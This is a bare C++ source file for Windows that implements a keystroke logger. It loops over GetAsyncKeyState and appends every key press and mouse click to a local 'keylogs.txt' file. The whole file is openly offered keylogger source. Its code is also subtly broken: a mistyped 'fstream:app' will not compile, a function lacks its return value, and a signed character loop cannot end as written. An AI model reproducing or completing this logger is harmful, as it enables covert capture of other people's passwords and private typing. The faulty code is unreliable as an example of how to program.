#include <Windows.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <string>

using namespace std;

void Write_Doc(LPCSTR text){
    ofstream logfile;
    logfile.open("keylogs.txt",fstream:app);
    logfile << text;
    logfile.close();
}

bool KeyIsPressed(int ikey){
  switch (ikey) {
    case VK_SPACE:
      cout<<" ";
      Write_Doc(" ");
      break;

    case VK_RETURN:
      cout<<"\n";
      Write_Doc("\n");
      break;

    case VK_SHIFT:
      cout<<"*Shift*";
      Write_Doc(" *Shift* ");
      break;

      case VK_BACK:
        cout<<"\b";
        Write_Doc("\b");
        break;

      case VK_RBUTTON:
        cout<<" *rclick* ";
        Write_Doc(" *rclick* ");
        break;

      case VK_LBUTTON:
        cout<<" *lclick* ";
        Write_Doc(" *lclick* ");
        break;

      default: return false;
  }
}

int main(){
  char key;
  while(TRUE){
    Sleep(10);
    for(key = 8; key <= 190; ++key){
      if(GetAsyncKeyState(key) == -32767){
        if(KeyIsPressed(key) == FALSE){
          cout<<key;
          ofstream logfile;
          logfile.open("keylogs.txt",fstream:app);
          logfile << key;
          logfile.close();
        }
      }
    }
  }
}
